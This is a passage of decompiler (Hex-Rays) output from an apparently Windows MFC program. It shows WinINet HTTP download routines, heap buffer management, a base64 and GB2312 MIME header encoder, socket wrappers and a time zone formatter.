              *((_DWORD *)this[1] - 2) != 0 ? 3 : 1,
              *((_DWORD *)this[1] - 2) != 0 ? (LPCSTR)this[1] : 0,
              0,
              0);
  return *this != 0;
}

//----- (00407890) --------------------------------------------------------
HINTERNET __thiscall sub_407890(HINTERNET *this)
{
  HINTERNET result; // eax

  result = *this;
  if ( *this )
  {
    result = (HINTERNET)InternetCloseHandle(*this);
    *this = 0;
  }
  return result;
}

//----- (004078D0) --------------------------------------------------------
BOOL __thiscall sub_4078D0(int this, HINTERNET hInternet)
{
  int v3; // eax
  int Buffer; // [esp+Ch] [ebp-Ch] BYREF
  int v6; // [esp+10h] [ebp-8h]
  int v7; // [esp+14h] [ebp-4h]

  v3 = *(_DWORD *)(this + 4);
  v7 = 0;
  if ( *(_DWORD *)(v3 - 8) )
  {
    Buffer = 3;
    v6 = v3;
  }
  else
  {
    Buffer = 0;
    v6 = 0;
  }
  InternetSetOptionA(*(HINTERNET *)this, 0x26u, &Buffer, 0xCu);
  InternetSetOptionA(hInternet, 0x2Bu, *(LPVOID *)(this + 8), *(_DWORD *)(*(_DWORD *)(this + 8) - 8) + 1);
  return InternetSetOptionA(hInternet, 0x2Cu, *(LPVOID *)(this + 12), *(_DWORD *)(*(_DWORD *)(this + 12) - 8) + 1);
}

//----- (00407940) --------------------------------------------------------
HINTERNET __thiscall sub_407940(HINTERNET *this)
{
  HINTERNET result; // eax

  result = this[4];
  if ( result )
  {
    result = (HINTERNET)InternetCloseHandle(this[4]);
    this[4] = 0;
  }
  return result;
}

//----- (00407960) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __thiscall sub_407960(HINTERNET *this, LPCSTR lpszObjectName, _DWORD *a3)
{
  LPCSTR v3; // esi
  bool v4; // zf
  void *v7; // eax
  void *v8; // esi
  void *v9; // ebx
  int v10; // eax
  DWORD v11; // eax
  _BYTE *v12; // esi
  const char **v13; // [esp-14h] [ebp-ACh]
  int v14; // [esp-10h] [ebp-A8h] BYREF
  char Buffer[32]; // [esp+Ch] [ebp-8Ch] BYREF
  int v16[5]; // [esp+2Ch] [ebp-6Ch] BYREF
  char v17[4]; // [esp+40h] [ebp-58h] BYREF
  LPCSTR lpszAcceptTypes[2]; // [esp+48h] [ebp-50h] BYREF
  DWORD dwNumberOfBytesRead; // [esp+54h] [ebp-44h] BYREF
  int v20; // [esp+58h] [ebp-40h] BYREF
  INTERNET_PORT nServerPort[2]; // [esp+5Ch] [ebp-3Ch] BYREF
  int v22; // [esp+60h] [ebp-38h]
  void *v23; // [esp+64h] [ebp-34h]
  DWORD dwFlags; // [esp+68h] [ebp-30h] BYREF
  void *v25; // [esp+6Ch] [ebp-2Ch]
  DWORD dwService; // [esp+70h] [ebp-28h] BYREF
  DWORD dwBufferLength; // [esp+74h] [ebp-24h] BYREF
  LPCSTR lpszServerName; // [esp+78h] [ebp-20h] BYREF
  LPCSTR lpszUserName; // [esp+7Ch] [ebp-1Ch] BYREF
  LPCSTR lpszPassword; // [esp+80h] [ebp-18h] BYREF
  LPCSTR lpszUrl[2]; // [esp+84h] [ebp-14h] BYREF
  int v32; // [esp+94h] [ebp-4h]

  v3 = lpszObjectName;
  v4 = lpszObjectName == 0;
  lpszUrl[1] = (LPCSTR)&v14;
  a3[4] = 0;
  if ( v4 || !*v3 )
    return 0;
  v25 = 0;
  v23 = 0;
  v22 = 0;
  AFX_EXCEPTION_LINK::AFX_EXCEPTION_LINK((AFX_EXCEPTION_LINK *)v17);
  v32 = 5;
  lpszServerName = (LPCSTR)off_42667C;
  lpszObjectName = (LPCSTR)off_42667C;
  lpszUserName = (LPCSTR)off_42667C;
  lpszPassword = (LPCSTR)off_42667C;
  sub_41698C((CString *)lpszUrl, v3);
  LOBYTE(v32) = 6;
  sub_414F68((const unsigned __int8 **)lpszUrl, (CString *)&dwFlags, Control);
  sub_41691E(&dwFlags);
  if ( !sub_41ADF2(
          lpszUrl[0],
          &dwService,
          (CString *)&lpszServerName,
          (CString *)&lpszObjectName,
          nServerPort,
          (CString *)&lpszUserName,
          (CString *)&lpszPassword,
          0x20000000u) )
    goto LABEL_7;
  dwFlags = -2080374784;
  if ( dwService == 4107 )
  {
    dwService = 3;
    dwFlags = -2071986176;
  }
  if ( sub_407840(this) )
  {
    v7 = InternetConnectA(*this, lpszServerName, nServerPort[0], lpszUserName, lpszPassword, dwService, 0, 0);
    v8 = v7;
    v25 = v7;
    if ( v7 )
    {
      sub_4078D0((int)this, v7);
      v13 = (const char **)sub_414F68((const unsigned __int8 **)&lpszObjectName, (CString *)&v20, Control);
      LOBYTE(v32) = 7;
      sub_416A0B((void **)&lpszObjectName, v13);
      LOBYTE(v32) = 6;
      sub_41691E(&v20);
      lpszAcceptTypes[0] = aAccept;
      lpszAcceptTypes[1] = 0;
      v9 = HttpOpenRequestA(v8, szVerb, lpszObjectName, szVersion, 0, lpszAcceptTypes, dwFlags, 0);
      v23 = v9;
      if ( v9 && HttpSendRequestA(v9, szHeaders, strlen(szHeaders), 0, 0) )
      {
        dwBufferLength = 32;
        if ( HttpQueryInfoA(v9, 5u, Buffer, &dwBufferLength, 0) && (v10 = atol(Buffer), v10 > 0) )
        {
          v11 = v10 + 1;
          if ( v11 <= 0x19000 )
            dwBufferLength = v11;
          else
            dwBufferLength = 102400;
        }
        else
        {
          dwBufferLength = 10240;
        }
        sub_407DB0(v16);
        LOBYTE(v32) = 8;
        v12 = sub_407DD0(v16, dwBufferLength);
        if ( v12 )
        {
          while ( InternetReadFile(v9, v12, dwBufferLength, &dwNumberOfBytesRead) )
          {
            if ( !dwNumberOfBytesRead )
            {
              v22 = 1;
              break;
            }
            sub_408040(a3, v12, dwNumberOfBytesRead);
          }
        }
        LOBYTE(v32) = 6;
        v16[0] = (int)&off_41F1E4;
        sub_407FB0((int)v16);
        LOBYTE(v32) = 5;
        sub_41691E(lpszUrl);
        LOBYTE(v32) = 4;
        sub_41691E(&lpszPassword);
        LOBYTE(v32) = 3;
        sub_41691E(&lpszUserName);
        LOBYTE(v32) = 2;
        sub_41691E(&lpszObjectName);
        LOBYTE(v32) = 1;
        sub_41691E(&lpszServerName);
        v32 = -1;
        AfxTryCleanup();
        v8 = v25;
      }
      else
      {
        LOBYTE(v32) = 5;
        sub_41691E(lpszUrl);
        LOBYTE(v32) = 4;
        sub_41691E(&lpszPassword);
        LOBYTE(v32) = 3;
        sub_41691E(&lpszUserName);
        LOBYTE(v32) = 2;
        sub_41691E(&lpszObjectName);
        LOBYTE(v32) = 1;
        sub_41691E(&lpszServerName);
        v32 = -1;
        AfxTryCleanup();
      }
      if ( v9 )
        InternetCloseHandle(v9);
    }
    else
    {
      LOBYTE(v32) = 5;
      sub_41691E(lpszUrl);
      LOBYTE(v32) = 4;
      sub_41691E(&lpszPassword);
      LOBYTE(v32) = 3;
      sub_41691E(&lpszUserName);
      LOBYTE(v32) = 2;
      sub_41691E(&lpszObjectName);
      LOBYTE(v32) = 1;
      sub_41691E(&lpszServerName);
      v32 = -1;
      AfxTryCleanup();
    }
    if ( v8 )
      InternetCloseHandle(v8);
    return v22;
  }
  else
  {
LABEL_7:
    LOBYTE(v32) = 5;
    sub_41691E(lpszUrl);
    LOBYTE(v32) = 4;
    sub_41691E(&lpszPassword);
    LOBYTE(v32) = 3;
    sub_41691E(&lpszUserName);
    LOBYTE(v32) = 2;
    sub_41691E(&lpszObjectName);
    LOBYTE(v32) = 1;
    sub_41691E(&lpszServerName);
    v32 = -1;
    AfxTryCleanup();
    return v22;
  }
}
// 407D72: positive sp value 10 has been found
// 41F1E4: using guessed type void *off_41F1E4;
// 42667C: using guessed type void *off_42667C;
// 407960: using guessed type char var_58[4];

//----- (00407DB0) --------------------------------------------------------
_DWORD *__thiscall sub_407DB0(_DWORD *this)
{
  _DWORD *result; // eax

  result = this;
  *this = &off_41F1E8;
  this[1] = &unk_4367B8;
  this[2] = 0;
  this[4] = 0;
  this[3] = 0;
  return result;
}
// 41F1E8: using guessed type void *off_41F1E8;

//----- (00407DD0) --------------------------------------------------------
LPVOID __thiscall sub_407DD0(_DWORD *this, signed int a2)
{
  LPVOID result; // eax
  int v4; // eax
  int v5; // eax
  int v6; // edx
  HANDLE ProcessHeap; // eax

  if ( this[2] )
    return sub_407EA0((int)this, a2);
  if ( !a2 )
    return 0;
  if ( dword_426318 == 1 && a2 <= 512 && (v4 = this[1], *(int *)v4 < 96) )
  {
    v5 = sub_408150((_BYTE *)(v4 + 4), 96, 0);
    *(_BYTE *)(this[1] + v5 + 4) = 1;
    ++*(_DWORD *)this[1];
    v6 = this[1];
    this[4] = a2;
    this[3] = 512;
    result = (LPVOID)((v5 << 9) + v6 + 100);
    this[2] = result;
  }
  else
  {
    ProcessHeap = dword_44281C;
    if ( !dword_44281C )
    {
      ProcessHeap = GetProcessHeap();
      dword_44281C = ProcessHeap;
    }
    result = HeapAlloc(ProcessHeap, 0, a2 + 128);
    this[2] = result;
    if ( result )
    {
      this[4] = a2;
      this[3] = a2 + 128;
    }
    else
    {
      this[3] = 0;
      this[4] = 0;
    }
  }
  return result;
}
// 426318: using guessed type int dword_426318;

//----- (00407EA0) --------------------------------------------------------
LPVOID __thiscall sub_407EA0(int this, signed int a2)
{
  LPVOID result; // eax
  int v5; // ecx
  BOOL v6; // esi
  signed int v7; // ecx
  HANDLE ProcessHeap; // eax
  void *v9; // eax
  signed int v10; // ecx
  void *v11; // [esp+10h] [ebp+4h]

  if ( !a2 )
  {
    sub_407FB0(this);
    return 0;
  }
  result = *(LPVOID *)(this + 8);
  if ( !result )
    return (LPVOID)sub_407DD0(a2);
  v5 = *(_DWORD *)(this + 4);
  v6 = (unsigned int)result >= v5 + 100 && (unsigned int)result < v5 + 49252;
  v7 = *(_DWORD *)(this + 12);
  if ( v7 >= a2 && (v6 || v7 - a2 <= 256) )
  {
    *(_DWORD *)(this + 16) = a2;
  }
  else
  {
    ProcessHeap = dword_44281C;
    if ( !dword_44281C )
    {
      ProcessHeap = GetProcessHeap();
      dword_44281C = ProcessHeap;
    }
    if ( v6 )
    {
      v9 = HeapAlloc(ProcessHeap, 0, a2 + 128);
      v11 = v9;
      if ( !v9 )
        return 0;
      v10 = *(_DWORD *)(this + 16);
      if ( a2 < v10 )
        v10 = a2;
      qmemcpy(v9, *(const void **)(this + 8), v10);
      sub_407FD0((_DWORD *)this, *(LPVOID *)(this + 8));
      result = v11;
      *(_DWORD *)(this + 16) = a2;
      *(_DWORD *)(this + 8) = v11;
      *(_DWORD *)(this + 12) = a2 + 128;
    }
    else
    {
      result = HeapReAlloc(ProcessHeap, 0, *(LPVOID *)(this + 8), a2 + 128);
      if ( !result )
        return 0;
      *(_DWORD *)(this + 12) = a2 + 128;
      *(_DWORD *)(this + 16) = a2;
      *(_DWORD *)(this + 8) = result;
    }
  }
  return result;
}
// 407DD0: using guessed type _DWORD __stdcall sub_407DD0(_DWORD);

//----- (00407FB0) --------------------------------------------------------
int __thiscall sub_407FB0(int this)
{
  int result; // eax

  sub_407FD0((_DWORD *)this, *(LPVOID *)(this + 8));
  result = 0;
  *(_DWORD *)(this + 8) = 0;
  *(_DWORD *)(this + 16) = 0;
  *(_DWORD *)(this + 12) = 0;
  return result;
}

//----- (00407FD0) --------------------------------------------------------
void __thiscall sub_407FD0(_DWORD *this, LPVOID lpMem)
{
  int v2; // esi
  HANDLE ProcessHeap; // eax

  if ( lpMem )
  {
    v2 = this[1];
    if ( (unsigned int)lpMem < v2 + 100 || (unsigned int)lpMem >= v2 + 49252 )
    {
      ProcessHeap = dword_44281C;
      if ( !dword_44281C )
      {
        ProcessHeap = GetProcessHeap();
        dword_44281C = ProcessHeap;
      }
      HeapFree(ProcessHeap, 0, lpMem);
    }
    else
    {
      *(_BYTE *)(((int)lpMem - v2 - 100) / 512 + v2 + 4) = 0;
      --*(_DWORD *)this[1];
    }
  }
}

//----- (00408040) --------------------------------------------------------
int __thiscall sub_408040(_DWORD *this, _BYTE *Src, signed int Size)
{
  int v3; // esi
  int result; // eax
  _BYTE *v5; // eax

  if ( Size > 0 )
  {
    v3 = this[4];
    result = (int)sub_407EA0((int)this, v3 + Size);
    if ( !result )
      return result;
    v5 = (_BYTE *)(v3 + result);
    if ( Src )
    {
      sub_4080A0(v5, Src, Size);
      return 1;
    }
    sub_408100(v5, Size);
  }
  return 1;
}

//----- (004080A0) --------------------------------------------------------
_BYTE *__cdecl sub_4080A0(_BYTE *a1, _BYTE *Src, int Size)
{
  _BYTE *result; // eax

  result = (_BYTE *)Size;
  if ( Size )
  {
    switch ( Size )
    {
      case 1:
        result = Src;
        *a1 = *Src;
        break;
      case 2:
        result = Src;
        *(_WORD *)a1 = *(_WORD *)Src;
        break;
      case 4:
        result = Src;
        *(_DWORD *)a1 = *(_DWORD *)Src;
        break;
      default:
        return memcpy(a1, Src, Size);
    }
  }
  return result;
}

//----- (00408100) --------------------------------------------------------
_BYTE *__cdecl sub_408100(_BYTE *a1, unsigned int a2)
{
  _BYTE *result; // eax

  if ( a2 )
  {
    switch ( a2 )
    {
      case 1u:
        result = a1;
        *a1 = 0;
        break;
      case 2u:
        *(_WORD *)a1 = 0;
        break;
      case 4u:
        *(_DWORD *)a1 = 0;
        break;
      default:
        result = 0;
        memset(a1, 0, a2);
        break;
    }
  }
  return result;
}

//----- (00408150) --------------------------------------------------------
int __cdecl sub_408150(_BYTE *a1, int a2, unsigned __int8 a3)
{
  bool v3; // zf
  int v5; // ecx
  _BYTE *v6; // edi
  int v7; // [esp+4h] [ebp-4h]

  v7 = -1;
  if ( a2 > 0 )
  {
    v3 = *a1 == a3;
    if ( *a1 == a3 )
      return 0;
    v5 = a2;
    v6 = a1;
    do
    {
      if ( !v5 )
        break;
      v3 = *v6++ == a3;
      --v5;
    }
    while ( !v3 );
    if ( v3 )
      return a2 - (v5 + 1);
  }
  return v7;
}

//----- (004081A0) --------------------------------------------------------
int __cdecl sub_4081A0(char *a1)
{
  char *v1; // ecx
  char v2; // al

  v1 = a1;
  v2 = *a1;
  if ( !*a1 )
    return 1;
  while ( v2 >= 0 )
  {
    v2 = *++v1;
    if ( !v2 )
      return 1;
  }
  return 0;
}

//----- (004081C0) --------------------------------------------------------
char *__cdecl sub_4081C0(char *a1)
{
  bool v1; // zf
  char *result; // eax

  v1 = sub_4081A0(a1) == 0;
  result = aUsAscii;
  if ( v1 )
    return aGb2312;
  return result;
}

//----- (004081E0) --------------------------------------------------------
void **__cdecl sub_4081E0(int a1, int a2, int a3, int a4, void **a5)
{
  void **v5; // ebp
  void **v7; // esi
  CHAR *v8; // edi

  if ( 4 * ((a2 + 2) / 3) <= a3 || a2 <= 1 )
  {
    v7 = a5;
    if ( !a4 )
      sub_416B60(a5, asc_426340);
    sub_416B60(v7, aGb2312B);
    v8 = sub_408300(a1, a2, &a4, 0);
    sub_416B60(v7, v8);
    sub_416688(v8);
    return sub_416B60(v7, asc_426330);
  }
  else
  {
    v5 = a5;
    sub_4081E0(a1, a2 / 2, a3, a4, a5);
    return (void **)sub_4081E0(a1 + a2 / 2, a2 - a2 / 2, a3, 0, v5);
  }
}

//----- (004082A0) --------------------------------------------------------
void **__cdecl sub_4082A0(CHAR *lpString, CString *a2)
{
  if ( sub_4081A0(lpString) )
    return (void **)CString::operator=(a2, lpString);
  else
    return sub_4081E0((int)lpString, strlen(lpString), 68 - strlen(aGb2312), 1, (void **)a2);
}

//----- (00408300) --------------------------------------------------------
_BYTE *__cdecl sub_408300(int a1, int a2, _DWORD *a3, int a4)
{
  int v4; // ebp
  _BYTE *v5; // esi
  int v6; // ebx
  int v7; // ecx
  int v8; // edi
  int v9; // eax
  int v10; // ebp
  int v11; // edi
  int v12; // edx
  int v13; // ecx
  int v14; // edx
  int v15; // eax
  int v16; // ebp
  int v17; // edx
  int v18; // ecx
  int v19; // edx
  int v20; // ecx
  char v21; // al
  int v22; // ecx
  char v23; // al
  _BYTE *result; // eax
  int v25; // [esp+10h] [ebp-4Ch]
  int v26; // [esp+14h] [ebp-48h]
  char v27[68]; // [esp+18h] [ebp-44h] BYREF

  v4 = a2;
  strcpy(v27, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
  v5 = sub_41665F(4 * ((a2 + 2) / 3) + 4 * ((a2 + 2) / 3) * strlen(asc_426344) / 0x4C + 3);
  v6 = a1;
  v7 = 0;
  v8 = 0;
  v25 = 0;
  if ( a2 / 3 > 0 )
  {
    v26 = a2 / 3;
    while ( 1 )
    {
      v9 = *(unsigned __int8 *)(v8 + v6);
      v10 = *(unsigned __int8 *)(v8 + v6 + 1);
      v11 = v8 + 2;
      v12 = *(unsigned __int8 *)(v11 + v6);
      v8 = v11 + 1;
      v5[v7] = v27[(v9 >> 2) & 0x3F];
      v13 = v7 + 1;
      v5[v13] = v27[(16 * (v9 & 3)) | (v10 >> 4) & 0xF];
      v13 += 2;
      LOBYTE(v9) = v27[(4 * (v10 & 0xF)) | (v12 >> 6) & 3];
      LOBYTE(v12) = v27[v12 & 0x3F];
      v5[v13 - 1] = v9;
      v5[v13] = v12;
      v7 = v13 + 1;
      v14 = v25 + 4;
      v25 += 4;
      if ( a4 && v14 >= 73 )
      {
        v5[v7++] = asc_426344[0];
        if ( byte_426345 )
          v5[v7++] = byte_426345;
        v25 = 0;
      }
      if ( !--v26 )
        break;
      v6 = a1;
    }
    v4 = a2;
    v6 = a1;
  }
  if ( v4 % 3 )
  {
    if ( v4 % 3 == 1 )
    {
      v19 = *(unsigned __int8 *)(v8 + v6);
      v20 = v7 + 1;
      v21 = v27[16 * (v19 & 3)];
      v5[v20 - 1] = v27[(v19 >> 2) & 0x3F];
      v5[v20] = v21;
      v18 = v20 + 1;
      v5[v18] = 61;
    }
    else
    {
      if ( v4 % 3 != 2 )
        goto LABEL_22;
      v15 = *(unsigned __int8 *)(v8 + v6 + 1);
      v16 = 16 * (*(_BYTE *)(v8 + v6) & 3);
      v5[v7] = v27[((int)*(unsigned __int8 *)(v8 + v6) >> 2) & 0x3F];
      v17 = v16 | (v15 >> 4) & 0xF;
      v18 = v7 + 2;
      LOBYTE(v15) = v27[4 * (v15 & 0xF)];
      v5[v18 - 1] = v27[v17];
      v5[v18] = v15;
    }
    v22 = v18 + 1;
    v5[v22] = 61;
    v7 = v22 + 1;
    if ( a4 )
    {
      v5[v7] = asc_426344[0];
      v23 = byte_426345;
      ++v7;
      if ( byte_426345 )
LABEL_21:
        v5[v7++] = v23;
    }
  }
  else if ( a4 )
  {
    v5[v7] = asc_426344[0];
    v23 = byte_426345;
    ++v7;
    if ( byte_426345 )
      goto LABEL_21;
  }
LABEL_22:
  v5[v7] = 0;
  result = v5;
  *a3 = v7;
  return result;
}
// 426345: using guessed type char byte_426345;

//----- (00408520) --------------------------------------------------------
_DWORD *__thiscall sub_408520(_DWORD *this)
{
  _DWORD *result; // eax

  result = this;
  *this = -1;
  return result;
}

//----- (00408540) --------------------------------------------------------
BOOL __thiscall sub_408540(SOCKET *this, char *buf, int len)
{
  return send(*this, buf, len, 0) != -1;
}

//----- (00408570) --------------------------------------------------------
int __thiscall sub_408570(SOCKET *this, char *buf, int len)
{
  return recv(*this, buf, len, 0);
}

//----- (00408590) --------------------------------------------------------
int __thiscall sub_408590(SOCKET *this)
{
  int result; // eax

  result = *this;
  if ( *this != -1 )
  {
    result = closesocket(*this);
    *this = -1;
  }
  return result;
}

//----- (004085B0) --------------------------------------------------------
int __thiscall sub_4085B0(SOCKET *this, _DWORD *a2)
{
  SOCKET v2; // eax
  int v3; // eax
  struct timeval timeout; // [esp+0h] [ebp-10Ch] BYREF
  fd_set readfds; // [esp+8h] [ebp-104h] BYREF

  v2 = *this;
  timeout.tv_sec = 0;
  timeout.tv_usec = 0;
  readfds.fd_array[0] = v2;
  readfds.fd_count = 1;
  v3 = select(0, &readfds, 0, 0, &timeout);
  if ( v3 == -1 )
    return 0;
  *a2 = v3 != 0;
  return 1;
}

//----- (00408620) --------------------------------------------------------
_DWORD *__thiscall sub_408620(_DWORD *this)
{
  _DWORD *result; // eax

  result = this;
  *this = off_42667C;
  this[1] = off_42667C;
  return result;
}
// 42667C: using guessed type void *off_42667C;

//----- (00408640) --------------------------------------------------------
int __thiscall sub_408640(int this, const char **a2)
{
  *(_DWORD *)this = off_42667C;
  *(_DWORD *)(this + 4) = off_42667C;
  sub_4086A0((void **)this, a2);
  return this;
}
// 42667C: using guessed type void *off_42667C;

//----- (004086A0) --------------------------------------------------------
void **__thiscall sub_4086A0(void **this, const char **a2)
{
  sub_416A0B(this, a2);
  sub_416A0B(this + 1, a2 + 1);
  return this;
}

//----- (004086D0) --------------------------------------------------------
CString *__thiscall sub_4086D0(void *this, CString *a2)
{
  CHAR *v2; // eax
  int v4; // [esp+4h] [ebp-18h] BYREF
  int v5; // [esp+8h] [ebp-14h] BYREF
  int v6; // [esp+Ch] [ebp-10h]
  int v7; // [esp+18h] [ebp-4h]

  v6 = 0;
  v4 = (int)off_42667C;
  v2 = *(CHAR **)this;
  v7 = 1;
  if ( *((_DWORD *)v2 - 2) )
  {
    v5 = (int)off_42667C;
    LOBYTE(v7) = 2;
    sub_4082A0(v2, (CString *)&v5);
    sub_4152E0((CString *)&v4, aSS, v5);
    LOBYTE(v7) = 1;
    sub_41691E(&v5);
  }
  else
  {
    sub_416A0B((void **)&v4, (const char **)this + 1);
  }
  sub_416693(a2, (LPCSTR *)&v4);
  v6 = 1;
  LOBYTE(v7) = 0;
  sub_41691E(&v4);
  return a2;
}
// 42667C: using guessed type void *off_42667C;

//----- (004087A0) --------------------------------------------------------
void __thiscall sub_4087A0(_DWORD *this)
{
  void *v2; // eax

  v2 = (void *)this[2];
  if ( v2 )
  {
    sub_416688(v2);
    this[2] = 0;
  }
  sub_41691E(this + 1);
  sub_41691E(this);
}

//----- (00408810) --------------------------------------------------------
_DWORD *__thiscall sub_408810(_DWORD *this)
{
  sub_408620(this + 1);
  this[3] = off_42667C;
  this[4] = off_42667C;
  sub_408620(this + 5);
  this[7] = &off_41F1FC;
  this[8] = 0;
  this[11] = 0;
  this[10] = 0;
  this[9] = 0;
  this[12] = &off_41F1FC;
  this[13] = 0;
  this[16] = 0;
  this[15] = 0;
  this[14] = 0;
  this[17] = &off_41F1FC;
  this[18] = 0;
  this[21] = 0;
  this[20] = 0;
  this[19] = 0;
  this[22] = &off_41F1F0;
  this[23] = 0;
  this[26] = 0;
  this[25] = 0;
  this[24] = 0;
  *this = &off_41F1EC;
  return this;
}
// 41F1EC: using guessed type void (__stdcall __noreturn *off_41F1EC)(int);
// 41F1F0: using guessed type int (*off_41F1F0)();
// 41F1FC: using guessed type int (*off_41F1FC)();
// 42667C: using guessed type void *off_42667C;

//----- (00408890) --------------------------------------------------------
void __thiscall sub_408890(int this)
{
  void *v2; // eax
  _DWORD *v3; // ebx
  int v4; // ebp
  _DWORD *v5; // ebx
  int v6; // ebp
  _DWORD *v7; // ebx
  int v8; // ebp

  *(_DWORD *)this = &off_41F1EC;
  sub_408B20(this);
  *(_DWORD *)(this + 88) = &off_41F1F0;
  v2 = *(void **)(this + 92);
  if ( v2 )
    sub_416688(v2);
  *(_DWORD *)(this + 68) = &off_41F1FC;
  v3 = *(_DWORD **)(this + 72);
  if ( v3 )
  {
    if ( *(_DWORD *)(this + 76) )
    {
      v4 = *(_DWORD *)(this + 76);
      do
      {
        sub_408A20(v3);
        v3 += 2;
        --v4;
      }
      while ( v4 );
    }
    sub_416688(*(LPVOID *)(this + 72));
  }
  *(_DWORD *)(this + 48) = &off_41F1FC;
  v5 = *(_DWORD **)(this + 52);
  if ( v5 )
  {
    if ( *(_DWORD *)(this + 56) )
    {
      v6 = *(_DWORD *)(this + 56);
      do
      {
        sub_408A20(v5);
        v5 += 2;
        --v6;
      }
      while ( v6 );
    }
    sub_416688(*(LPVOID *)(this + 52));
  }
  *(_DWORD *)(this + 28) = &off_41F1FC;
  v7 = *(_DWORD **)(this + 32);
  if ( v7 )
  {
    if ( *(_DWORD *)(this + 36) )
    {
      v8 = *(_DWORD *)(this + 36);
      do
      {
        sub_408A20(v7);
        v7 += 2;
        --v8;
      }
      while ( v8 );
    }
    sub_416688(*(LPVOID *)(this + 32));
  }
  sub_41691E((_DWORD *)(this + 24));
  sub_41691E((_DWORD *)(this + 20));
  sub_41691E((_DWORD *)(this + 16));
  sub_41691E((_DWORD *)(this + 12));
  sub_41691E((_DWORD *)(this + 8));
  sub_41691E((_DWORD *)(this + 4));
}
// 41F1EC: using guessed type void (__stdcall __noreturn *off_41F1EC)(int);
// 41F1F0: using guessed type int (*off_41F1F0)();
// 41F1FC: using guessed type int (*off_41F1FC)();

//----- (00408A20) --------------------------------------------------------
void __thiscall sub_408A20(_DWORD *this)
{
  sub_41691E(this + 1);
  sub_41691E(this);
}

//----- (00408A70) --------------------------------------------------------
void __thiscall sub_408A70(void **this)
{
  const char *v2; // [esp+4h] [ebp-14h] BYREF
  int v3; // [esp+8h] [ebp-10h] BYREF
  int v4; // [esp+14h] [ebp-4h]

  sub_408620(&v2);
  v4 = 0;
  sub_4086A0(this + 1, &v2);
  sub_4086A0(this + 5, &v2);
  CString::Empty((CString *)(this + 3));
  CString::Empty((CString *)(this + 4));
  sub_409C30((int)(this + 7), 0, -1);
  sub_409C30((int)(this + 12), 0, -1);
  sub_409C30((int)(this + 17), 0, -1);
  v4 = 1;
  sub_41691E(&v3);
  v4 = -1;
  sub_41691E(&v2);
}

//----- (00408B20) --------------------------------------------------------
void __thiscall sub_408B20(int this)
{
  int v2; // ebp
  int i; // ebx
  _DWORD *v4; // edi

  v2 = sub_408D00((_DWORD *)this);
  for ( i = 0; i < v2; ++i )
  {
    v4 = (_DWORD *)sub_408CF0((_DWORD *)this, i);
    if ( v4[4] && v4 )
    {
      sub_4087A0(v4);
      sub_416688(v4);
    }
  }
  if ( *(_DWORD *)(this + 92) )
  {
    sub_416688(*(LPVOID *)(this + 92));
    *(_DWORD *)(this + 92) = 0;
  }
  *(_DWORD *)(this + 100) = 0;
  *(_DWORD *)(this + 96) = 0;
}

//----- (00408B80) --------------------------------------------------------
int __thiscall sub_408B80(_DWORD *this, int a2)
{
  int result; // eax

  result = 0;
  switch ( a2 )
  {
    case 0:
      return this[9];
    case 1:
      return this[14];
    case 2:
      return this[19];
  }
  return result;
}

//----- (00408BB0) --------------------------------------------------------
int __thiscall sub_408BB0(_DWORD *this, int a2, int a3, int a4)
{
  const char **v5; // eax
  char *v6; // ecx
  const char **v7; // eax
  const char **v8; // eax
  void *v10; // [esp+Ch] [ebp-2Ch] BYREF
  int v11; // [esp+10h] [ebp-28h] BYREF
  char v12[4]; // [esp+14h] [ebp-24h] BYREF
  int v13; // [esp+18h] [ebp-20h] BYREF
  char v14[4]; // [esp+1Ch] [ebp-1Ch] BYREF
  int v15; // [esp+20h] [ebp-18h] BYREF
  char v16[4]; // [esp+24h] [ebp-14h] BYREF
  int v17; // [esp+28h] [ebp-10h] BYREF
  int v18; // [esp+34h] [ebp-4h]

  sub_408620(&v10);
  v18 = 1;
  switch ( a4 )
  {
    case 0:
      v8 = (const char **)sub_409780(this + 7, (int)v16, a3);
      LOBYTE(v18) = 2;
      sub_4086A0(&v10, v8);
      LOBYTE(v18) = 3;
      sub_41691E(&v17);
      LOBYTE(v18) = 1;
      v6 = v16;
      goto LABEL_7;
    case 1:
      v7 = (const char **)sub_409780(this + 12, (int)v14, a3);
      LOBYTE(v18) = 4;
      sub_4086A0(&v10, v7);
      LOBYTE(v18) = 5;
      sub_41691E(&v15);
      LOBYTE(v18) = 1;
      v6 = v14;
      goto LABEL_7;
    case 2:
      v5 = (const char **)sub_409780(this + 17, (int)v12, a3);
      LOBYTE(v18) = 6;
      sub_4086A0(&v10, v5);
      LOBYTE(v18) = 7;
      sub_41691E(&v13);
      LOBYTE(v18) = 1;
      v6 = v12;
LABEL_7:
      sub_41691E(v6);
      break;
  }
  sub_408640(a2, (const char **)&v10);
  v18 = 8;
  sub_41691E(&v11);
  LOBYTE(v18) = 0;
  sub_41691E(&v10);
  return a2;
}
// 408BB0: using guessed type char var_24[4];
// 408BB0: using guessed type char var_1C[4];
// 408BB0: using guessed type char var_14[4];

//----- (00408CF0) --------------------------------------------------------
int __thiscall sub_408CF0(_DWORD *this, int a2)
{
  return *(_DWORD *)(this[23] + 4 * a2);
}

//----- (00408D00) --------------------------------------------------------
int __thiscall sub_408D00(_DWORD *this)
{
  return this[24];
}

//----- (00408D10) --------------------------------------------------------
void __stdcall __noreturn sub_408D10(int a1)
{
  DWORD v1; // eax
  LONG Bias; // ecx
  unsigned int v3; // edx
  char v4[4]; // [esp+20h] [ebp-D4h] BYREF
  int v5[4]; // [esp+28h] [ebp-CCh] BYREF
  struct _TIME_ZONE_INFORMATION TimeZoneInformation; // [esp+3Ch] [ebp-B8h] BYREF
  int v7; // [esp+F0h] [ebp-4h]

  v5[3] = 0;
  v1 = GetTimeZoneInformation(&TimeZoneInformation);
  Bias = TimeZoneInformation.Bias;
  if ( v1 == 2 )
    Bias = TimeZoneInformation.DaylightBias + TimeZoneInformation.Bias;
  v5[0] = (int)off_42667C;
  v7 = 1;
  v3 = (int)(((unsigned __int64)(2004318071i64 * Bias) >> 32) - Bias) >> 5;
  sub_4152E0((CString *)v5, a2d2d, (v3 >> 31) + v3);
  ((void (__stdcall __noreturn *)(char *))loc_415378)(v4);
}
// 42667C: using guessed type void *off_42667C;
// 408D10: using guessed type char var_D4[4];

//----- (004091A0) --------------------------------------------------------
_DWORD *__thiscall sub_4091A0(_DWORD *this)
{
  sub_408520(this);
  sub_4153DC(this + 3);
  sub_4153DC(this + 8);
  this[14] = off_42667C;
  this[1] = 0;
  this[13] = 0;
  this[2] = 2000;
  return this;
}
